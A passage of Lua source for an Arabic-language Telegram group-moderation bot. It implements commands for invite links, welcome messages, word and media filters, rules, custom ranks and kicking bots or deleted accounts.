{{text="كرة قدم ⚽",url='https://t.me/gamee?game=FootballStar'}},
{{text="ورق🤹‍♂",url='https://t.me/gamee?game=Hexonix'},{text="Hexonix❌",url='https://t.me/gamee?game=Hexonix'}},
{{text="MotoFx🏍️",url='https://t.me/gamee?game=MotoFx'}},
{{text="لعبة 2048 🎰",url='https://t.me/awesomebot?game=g2048'},{text="Squares🏁",url='https://t.me/gamee?game=Squares'}},
{{text="Atomic 1▶️",url='https://t.me/gamee?game=AtomicDrop1'},{text="Corsairs",url='https://t.me/gamebot?game=Corsairs'}},
{{text="LumberJack",url='https://t.me/gamebot?game=LumberJack'}},
{{text="LittlePlane",url='https://t.me/gamee?game=LittlePlane'},{text="RollerDisco",url='https://t.me/gamee?game=RollerDisco'}},
{{text="🦖 لعبة التنين 🦖",url='https://t.me/T4TTTTBOT?game=dragon'},{text="🐍 لعبة الافعى 🐍",url='https://t.me/T4TTTTBOT?game=snake'}},
{{text="🔵 لعبة الالوان 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
{{text="🚀 لعبة الصاروخ 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 لعبة السهام 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
{{text = 'WaTaN TeaM .', url="t.me/WaTaNTeaM"}},

}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == "تفعيل صورتي" and ChanSub(msg) or text == 'تفعيل الصوره' and ChanSub(msg) then
if Constructor(msg) then  
database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," ✯︙تم تفعيل الصوره") 
return false  
end
end
if text == "تعطيل الصوره" and ChanSub(msg) or text == 'تعطيل صورتي' and ChanSub(msg) then
if Constructor(msg) then  
database:del(bot_id.."my_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," ✯︙تم تعطيل الصوره") 
return false end
end

if text == "تفعيل بايو" and ChanSub(msg) or text == 'تفعيل البايو' and ChanSub(msg) then
if Constructor(msg) then  
database:set(bot_id.."Absbio:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," ✯︙تم تفعيل البايو") 
return false  
end
end
if text == "تعطيل البايو" and ChanSub(msg) or text == 'تعطيل بايو' and ChanSub(msg) then
if Constructor(msg) then  
database:del(bot_id.."Absbio:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," ✯︙تم تعطيل البايو") 
return false end
end


if text == "الرابط" and ChanSub(msg) then 
local status_Link = database:get(bot_id.."Link_Group:status"..msg.chat_id_)
if not status_Link then
send(msg.chat_id_, msg.id_,"⚠️┇ الرابط معطل") 
return false  
end
if not database:get(bot_id.."InlineLink_Group:status"..msg.chat_id_) then
local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
if link then                              
send(msg.chat_id_,msg.id_,'𝒍𝒊𝒏𝒌 𝒈𝒓𝒐𝒖𝒑\n≪━━━━━━━━━━━━≫\n ['..link..']')                          
else                 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,linkgpp.result)
linkgp = '𝒍𝒊𝒏𝒌 𝒈𝒓𝒐𝒖𝒑\n≪━━━━━━━━━━━━≫\n ['..linkgpp.result..']'
else
linkgp = '✯︙ لا يوجد رابط ارسل ضع رابط'
end  
send(msg.chat_id_, msg.id_,linkgp)              
end     
else
local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
if link then
local Text = "✯︙رابط المجموعة : "
keyboard = {} 
keyboard.inline_keyboard = {{{text='𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌',url=link}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else                 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,linkgpp.result)
local Text = "✯︙رابط المجموعة : "
keyboard = {} 
keyboard.inline_keyboard = {{{text='𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌',url=linkgpp.result}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"✯︙ليست لدي صلاحية انشاء رابط ارسل ضع رابط لوضعه يدويا")
end  
end   
end         
end
if text == 'مسح الرابط' and ChanSub(msg) or text == 'حذف الرابط' and ChanSub(msg) then
if Mod(msg) then     
send(msg.chat_id_,msg.id_," ✯︙تم مسح الرابط")           
database:del(bot_id.."Private:Group:Link"..msg.chat_id_) 
return false      
end
end
if text and text:match("^ضع صوره") and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then  
database:set(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_,true) 
send(msg.chat_id_, msg.id_,'✯︙ارسل لي الصوره') 
return false
end
if text == "حذف الصوره" and ChanSub(msg) or text == "مسح الصوره" and ChanSub(msg) then 
if Mod(msg) then
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'✯︙تم ازالة صورة الكروب') 
end
return false  
end
if text == 'ضع وصف' and ChanSub(msg) or text == 'وضع وصف' and ChanSub(msg) then  
if Mod(msg) then
database:setex(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_,'✯︙ارسل الان الوصف')
end
return false  
end
if text == 'ضع ترحيب' and ChanSub(msg) or text == 'وضع ترحيب' and ChanSub(msg) then  
if Mod(msg) then
database:setex(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
t  = '✯︙ارسل لي الترحيب الان'
tt = '\n✯︙تستطيع اضافة مايلي !\n✯︙دالة عرض الاسم »{`name`}\n✯︙دالة عرض المعرف »{`user`}'
send(msg.chat_id_, msg.id_,t..tt) 
end
return false  
end
if text == 'الترحيب' and ChanSub(msg) and Mod(msg) then 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
GetWelcome = GetWelcomeGroup
else 
GetWelcome = '✯︙لم يتم تعيين ترحيب للكروب'
end 
send(msg.chat_id_, msg.id_,'['..GetWelcome..']') 
return false  
end
if text == 'تفعيل الترحيب' and ChanSub(msg) and Mod(msg) then  
database:set(bot_id..'Chek:Welcome'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل ترحيب الكروب') 
return false  
end
if text == 'تعطيل الترحيب' and ChanSub(msg) and Mod(msg) then  
database:del(bot_id..'Chek:Welcome'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل ترحيب الكروب') 
return false  
end
if text == 'مسح الترحيب' and ChanSub(msg) or text == 'حذف الترحيب' and ChanSub(msg) then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'✯︙تم ازالة ترحيب الكروب') 
end
end
if text and text == "منع" and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
send(msg.chat_id_, msg.id_," ✯︙ارسل الكلمه لمنعها")  
database:set(bot_id.."WaTaN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."WaTaN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ✯︙ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."WaTaN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."WaTaN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."WaTaN1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."WaTaN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ✯︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."WaTaN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."WaTaN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."WaTaN1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."WaTaN1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ✯︙ارسل الكلمه الان")  
database:set(bot_id.."WaTaN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."WaTaN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_," ✯︙تم الغاء منعها")  
database:del(bot_id.."WaTaN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."WaTaN1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."WaTaN1:List:Filter"..msg.chat_id_,text)  
return false  end  
end


if text == 'منع' and ChanSub(msg) and tonumber(msg.reply_to_message_id_) > 0 and Manager(msg) then     
function cb(a,b,c) 
textt = '✯︙تم منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:sadd(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:sadd(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:sadd(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح لن يتم ارسالها مجددا')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'الغاء منع' and ChanSub(msg) and tonumber(msg.reply_to_message_id_) > 0 and Manager(msg) then     
function cb(a,b,c) 
textt = '✯︙تم الغاء منع '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.set_id_
database:srem(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'الملصق'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.id_
database:srem(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'الصوره'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:srem(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'المتحركه'
send(msg.chat_id_, msg.id_,textt..'( '..text..' ) بنجاح يمكنهم الارسال الان')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end

if text == "مسح قائمه المنع" and Manager(msg) then   
local list = database:smembers(bot_id.."WaTaN1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."WaTaN1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."WaTaN1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."WaTaN1:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_," ✯︙تم مسح قائمه المنع")  
end

if text == "قائمه المنع" and ChanSub(msg) and Manager(msg) then   
local list = database:smembers(bot_id.."WaTaN1:List:Filter"..msg.chat_id_)  
t = "\n✯︙قائمة المنع \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do  
local WaTaN_Msg = database:get(bot_id.."WaTaN1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..WaTaN_Msg.."}\n"    
end  
if #list == 0 then  
t = " ✯︙لا يوجد كلمات ممنوعه"  
end  
send(msg.chat_id_, msg.id_,t)  
end  

if text == 'مسح قائمه منع المتحركات' and ChanSub(msg) and Manager(msg) then     
database:del(bot_id.."filteranimation"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'✯︙تم مسح قائمه منع المتحركات')  
end
if text == 'مسح قائمه منع الصور' and ChanSub(msg) and Manager(msg) then     
database:del(bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'✯︙تم مسح قائمه منع الصور')  
end
if text == 'مسح قائمه منع الملصقات' and ChanSub(msg) and Manager(msg) then     
database:del(bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,'✯︙تم مسح قائمه منع الملصقات')  
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'مسح كليشه المطور' and ChanSub(msg) and DevWaTaN(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,'✯︙تم مسح كليشه المطور')
end
if text == 'ضع كليشه المطور' and ChanSub(msg) and DevWaTaN(msg) then
database:set(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'✯︙ارسل الكليشه الان')
return false
end
if text and database:get(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' and ChanSub(msg) then 
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'✯︙تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'TEXT_SUDO',text)
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'✯︙تم حفظ كليشة المطور')
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'تعين الايدي' and ChanSub(msg) and Manager(msg) then
database:setex(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
local Text= [[
 ✯︙ارسل الان النص
 ✯︙يمكنك اضافه :
 ✯︙`#rdphoto` ➸ تعليق الصوره
 ✯︙`#username` ➸ اسم 
 ✯︙`#msgs` ➸ عدد رسائل 
 ✯︙`#photos` ➸ عدد صور 
 ✯︙`#id` ➸ ايدي 
 ✯︙`#auto` ➸ تفاعل 
 ✯︙`#stast` ➸ موقع  
 ✯︙`#bio` ➸ البايو
 ✯︙`#edit` ➸ السحكات
 ✯︙`#game` ➸ النقاط
]]
send(msg.chat_id_, msg.id_,Text)
return false  
end 
if text == 'حذف الايدي' and ChanSub(msg) or text == 'مسح الايدي' and ChanSub(msg) then
if Manager(msg) then
database:del(bot_id.."KLISH:ID"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✯︙تم ازالة كليشة الايدي')
end
return false  
end 

if database:get(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_," ✯︙تم الغاء تعين الايدي") 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."CHENG:ID"..msg.chat_id_..""..msg.sender_user_id_) 
local CHENGER_ID = text:match("(.*)")  
database:set(bot_id.."KLISH:ID"..msg.chat_id_,CHENGER_ID)
send(msg.chat_id_, msg.id_,'✯︙تم تعين الايدي')    
end

if text == 'طرد البوتات' and ChanSub(msg) or text == 'مسح البوتات' and ChanSub(msg) and Mod(msg) then 
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
chat_kick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, " ✯︙لا توجد بوتات في الكروب")
else
local t = '✯︙عدد البوتات هنا >> {'..c..'}\n✯︙عدد البوتات التي هي ادمن >> {'..x..'}\n✯︙تم طرد >> {'..(c - x)..'} من البوتات'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
end
if text == ("كشف البوتات") and ChanSub(msg) and Mod(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\n✯︙قائمة البوتات الموجوده \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = ' {★}'
end
text = text..">> [@"..ta.username_..']'..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, " ✯︙لا توجد بوتات في الكروب")
return false 
end
if #admins == i then 
local a = '\nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n✯︙عدد البوتات التي هنا >> {'..n..'} بوت\n'
local f = '✯︙عدد البوتات التي هي ادمن >> {'..t..'}\n✯︙ملاحضه علامة ال (✯) تعني ان البوت ادمن \n'
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
end

if database:get(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, " ✯︙تم الغاء حفظ القوانين") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_," ✯︙تم حفظ قوانين الكروب") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  

if text == 'ضع قوانين' and ChanSub(msg) or text == 'وضع قوانين' and ChanSub(msg) then 
if Mod(msg) then
database:setex(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_," ✯︙ارسل لي القوانين الان")  
end
end
if text == 'مسح القوانين' and ChanSub(msg) or text == 'حذف القوانين' and ChanSub(msg) then  
if Mod(msg) then
send(msg.chat_id_, msg.id_," ✯︙تم ازالة قوانين الكروب")  
database:del(bot_id.."Set:Rules:Group"..msg.chat_id_) 
end
end
if text == 'القوانين' and ChanSub(msg) then 
local Set_Rules = database:get(bot_id.."Set:Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_," ✯︙لا توجد قوانين")   
end    
end
if text == 'قفل التفليش' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:asiaoi","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل التفليش ')  
end,nil)   
end
if text == 'فتح التفليش' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagrvrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:asiaoi","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح التفليش ')  
end,nil)   
end
if text == 'طرد المحذوفين' and ChanSub(msg) or text == 'مسح المحذوفين' and ChanSub(msg) then  
if Mod(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
Group_Kick(msg.chat_id_, data.id_)
end
end,nil)
end
send(msg.chat_id_, msg.id_,'✯︙تم طرد المحذوفين')
end,nil)
end
end
if text == 'الصلاحيات' and ChanSub(msg) and Mod(msg) then 
local list = database:smembers(bot_id..'Coomds'..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,'✯︙لا توجد صلاحيات مضافه')
return false
end
t = "\n✯︙قائمة الصلاحيات المضافه \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
var = database:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..''..k..'- '..v..' » ('..var..')\n'
else
t = t..''..k..'- '..v..'\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text and text:match("^اضف صلاحيه (.*)$") and ChanSub(msg) and Mod(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
database:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
database:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew)  
database:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, " ✯︙ارسل نوع الرتبه \n✯︙{عـضـو -- ممـيـز -- ادمـن -- مـديـر}") 
end
if text and text:match("^مسح صلاحيه (.*)$") and ChanSub(msg) and Mod(msg) then 
ComdNew = text:match("^مسح صلاحيه (.*)$")
database:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
send(msg.chat_id_, msg.id_, "* ✯︙تم مسح الصلاحيه *\n") 
end
if database:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,"* ✯︙تم الغاء الامر *\n") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"* ✯︙تستطيع اضافه صلاحيات {ادمن - مميز - عضو} \n✯︙ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager(msg) then 
send(msg.chat_id_, msg.id_,"* ✯︙تستطيع اضافه صلاحيات {مميز - عضو} \n✯︙ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"* ✯︙تستطيع اضافه صلاحيات {عضو} \n✯︙ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مدير' or text == 'ادمن' or text == 'مميز' or text == 'عضو' then
local textn = database:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
database:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, " ✯︙تـم اضـافـه الامـر") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
if text and text:match('رفع (.*)') and ChanSub(msg) and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('رفع (.*)')
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'..'\n✯︙تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA) 
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'..'\n✯︙تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)
database:sadd(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'..'\n✯︙تم رفعه '..RTPA..'\n')   
database:set(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_,RTPA)  
database:sadd(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
elseif blakrt == 'عضو' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'..'\n✯︙تم رفعه '..RTPA..'\n')   
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match('تنزيل (.*)') and ChanSub(msg) and tonumber(msg.reply_to_message_id_) > 0 and Mod(msg) then 
local RTPA = text:match('تنزيل (.*)')
if database:sismember(bot_id..'Coomds'..msg.chat_id_,RTPA) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local blakrt = database:get(bot_id.."Comd:New:rt:bot:"..RTPA..msg.chat_id_)
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'..'\n✯︙م تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Special:User'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'ادمن' and Manager(msg) then 
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'..'\n✯︙تم تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Mod:User'..msg.chat_id_,result.sender_user_id_) 
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'مدير' and Constructor(msg) then
send(msg.chat_id_, msg.id_,'\n✯︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WaTaNTeaM')..')'..'\n✯︙تم تنزيله من '..RTPA..'\n')   
database:srem(bot_id..'Manager'..msg.chat_id_,result.sender_user_id_)  
database:del(bot_id.."Comd:New:rt:user:"..msg.chat_id_..result.sender_user_id_)
elseif blakrt == 'عضو' and Mod(msg) then
